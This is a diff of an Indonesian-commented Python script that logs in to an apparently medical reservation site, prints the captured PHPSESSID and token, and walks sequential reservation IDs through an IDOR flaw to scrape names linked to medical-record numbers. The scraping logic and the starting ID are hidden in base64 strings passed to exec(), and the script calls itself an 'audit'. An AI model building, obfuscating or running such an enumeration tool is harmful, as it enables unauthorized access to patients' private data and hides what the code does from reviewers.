@@ -70,7 +70,11 @@ def login():
                 print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                 return False
 
-        print("[\033[92m+\033[0m] Authentication Success. Session Token Hijacked.")
+        # Mendapatkan Session ID dari cookie untuk ditampilkan sebagai bukti audit
+        session_id = session.cookies.get_dict().get('PHPSESSID', 'Not Found')
+        print(f"[\033[92m+\033[0m] Authentication Success.")
+        print(f"[*] Captured Token : {token_t[:10]}...")
+        print(f"[*] Session ID     : {session_id}")
         return True
     except:
         return False
@@ -93,18 +97,18 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print success result.
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIEZvdW5kIFJNIDp7Zm9ybWF0dGVkX2lkWzoyXX0uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHttYXNrfScp"))
+        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 'Data ditemukan'.
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOntmb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHttYXNrfScp"))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
 
 def start_process(start_range, end_range):
     if login():
-        print(f"[*] Starting IDOR Scan for Doctor Reservations from range {start_range} to {end_range}...\n")
+        print(f"[*] Starting IDOR Scan  {start_range} to {end_range}...\n")
         with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
             executor.map(fetch_data, range(start_range, end_range + 1))
-        print("\n[*] IDOR Audit Completed for Doctor Reservations. Data displayed in terminal.")
+        print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
 
 def main_menu():
     while True:
@@ -123,9 +127,10 @@ def main_menu():
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '2':
             try:
-                start = int(input("[?] Range Awal: "))
-                end = int(input("[?] Range Akhir: "))
-                start_process(start, end)
+                count = int(input("[?] Jumlah data yang ingin di scan: "))
+                BASE_ID = int(_decode("NTAyMDEz")) # 502013
+                # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
+                start_process(BASE_ID, BASE_ID + count)
             except ValueError:
                 print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
             input("\nTekan Enter untuk kembali ke menu...")
